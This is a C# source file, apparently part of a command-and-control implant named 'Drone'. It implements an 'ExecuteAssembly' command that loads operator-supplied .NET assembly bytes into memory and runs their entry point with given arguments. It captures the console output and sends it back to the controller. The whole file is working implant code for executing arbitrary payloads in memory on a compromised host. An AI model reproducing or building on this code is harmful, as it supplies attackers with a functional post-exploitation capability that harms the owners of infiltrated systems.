using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class ExecuteAssembly : DroneCommand
{
    public override byte Command => 0x11;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var stdOut = Console.Out;
        var stdErr = Console.Error;

        using var ms = new MemoryStream();
        using var sw = new StreamWriter(ms)
        {
            AutoFlush = true
        };
        
        Console.SetOut(sw);
        Console.SetError(sw);

        try
        {
            var asm = Assembly.Load(task.Artefact);
            
            // blocks
            asm.EntryPoint?.Invoke(null, new object[] { task.Arguments });
            
            await sw.FlushAsync();
        }
        catch (Exception e)
        {
            await Drone.SendError(task, e.Message);
        }
        finally
        {
            Console.SetOut(stdOut);
            Console.SetError(stdErr);
        }
        
        var output = Encoding.UTF8.GetString(ms.ToArray());
        await Drone.SendOutput(task, output);
    }
}